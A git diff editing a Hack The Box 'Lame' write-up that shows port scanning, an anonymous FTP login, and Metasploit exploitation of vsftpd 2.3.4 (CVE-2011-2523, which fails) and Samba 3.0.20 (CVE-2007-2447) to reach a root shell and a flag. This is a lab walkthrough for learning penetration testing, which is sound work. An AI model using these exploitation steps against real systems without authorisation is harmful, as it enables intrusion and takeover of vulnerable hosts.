@@ -118,12 +118,13 @@ Nmap done: 1 IP address (1 host up) scanned in 61.56 seconds
 ```
 ## There are 4 open ports:
 * 21/tcp  open  ftp         vsftpd 2.3.4
-* 22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
-* 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
-* 445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
+* 22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0).
+* 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP).
+* 445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP).
 
-## FTP is open let try to logged in with default credentials
-* anonymous:anonymous
+## FTP is open let try to logged in with default credentials.
+* user: ```anonymous```
+* pass: ```anonymous```
 ```
 hack@box:~Lame$ ftp 10.10.10.3
 Connected to 10.10.10.3.
@@ -142,9 +143,10 @@ drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
 226 Directory send OK.
 ftp> 
 ```
-### It worked but FTP is empty
+### It worked but FTP is empty.
 
-## Let search for backdoor in VSFTPd version 2.3.4 in metasploit-framework
+## As the FTP version is given let search for any weakness.
+### So here is the ```CVE-2011-2523``` On VSFTPd version 2.3.4 we can exploit it using metasploit-framework.
 ```
 hack@box:~Lame$ msfconsole -q
 This copy of metasploit-framework is more than two weeks old.
@@ -188,9 +190,11 @@ msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
 msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 
 ```
 ### The exploit didn't work , we need to find another way.
-### As the smb service verion is given let seach for that:
+## As the smb service version is given let search for weakness.
+
 ![image](https://github.com/user-attachments/assets/6623cf5d-6d57-401b-9bb1-e522046892c0)
-### Here is a CVE 2007-2447 present on smb 3.0.20 that can be exploited by metasploit-framework
+
+### Here is a ```CVE 2007-2447``` present on smb 3.0.20 that can be exploited by metasploit-framework
 ## Let use metasploit again.
 ```
 hack@box:~Lame$ msfconsole -q
@@ -269,4 +273,4 @@ ac97c7c414c770a5783e5126fa9cf77b
 root@lame:/# 
 ```
 ### Additional 
-### If we read exploit vsftpd 2.3.4 - Backdoor Command Execution, we can undersatnd here they are trying to prevent backdoor, when someone try to exploit vsftpd backdoor firewall is triggered on port 6200.
+### If we read CVE-2011-2523 exploit vsftpd 2.3.4 - Backdoor Command Execution, we can undersatnd here they are trying to prevent backdoor, when someone try to exploit vsftpd backdoor firewall is triggered on port 6200.
